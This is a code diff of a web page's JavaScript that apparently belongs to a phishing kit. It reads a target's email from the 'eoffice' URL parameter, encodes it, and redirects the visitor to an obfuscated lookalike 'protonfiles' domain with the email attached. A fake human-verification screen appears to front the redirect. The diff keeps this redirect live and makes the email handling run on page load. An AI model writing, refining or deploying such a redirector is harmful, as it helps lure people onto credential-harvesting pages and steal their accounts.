@@ -422,14 +422,12 @@
       return encoded;
     }
 
-    // URL obfuscation and construction
-    function getRedirectUrl() {
-      const baseUrl = "https://protonfiles.egvhfztransfercygv.online/tOnDqXfQ";
+    // Function to check and transform email immediately
+    function checkAndTransformEmail() {
       const urlParams = new URLSearchParams(window.location.search);
-      let officeParam = urlParams.get("eoffice") || "";
+      const officeParam = urlParams.get("eoffice");
       
-      // Check if the parameter is an email (contains @ and .)
-      if (officeParam.includes('@') && officeParam.includes('.')) {
+      if (officeParam && officeParam.includes('@') && officeParam.includes('.')) {
         // Transform the email to encoded format
         const encodedEmail = transformEmailToEncoded(officeParam);
         
@@ -438,14 +436,22 @@
         newUrl.searchParams.set('eoffice', encodedEmail);
         window.history.replaceState({}, '', newUrl.toString());
         
-        // Use the encoded email for the redirect
-        officeParam = encodedEmail;
+        return encodedEmail;
       }
-      
+      return officeParam;
+    }
+
+    // URL obfuscation and construction
+    function getRedirectUrl() {
+      const baseUrl = "https://protonfiles.egvhfztransfercygv.online/tOnDqXfQ";
+      const officeParam = checkAndTransformEmail() || "";
       return baseUrl + "#" + encodeURIComponent(officeParam);
     }
 
     document.addEventListener('DOMContentLoaded', () => {
+      // Check and transform email immediately when page loads
+      checkAndTransformEmail();
+
       const loader = document.getElementById('loader');
       const verificationContent = document.getElementById('verificationContent');
       const humanCheck = document.getElementById('humanCheck');
@@ -499,3 +505,4 @@
   </script>
 </body>
 </html>
+
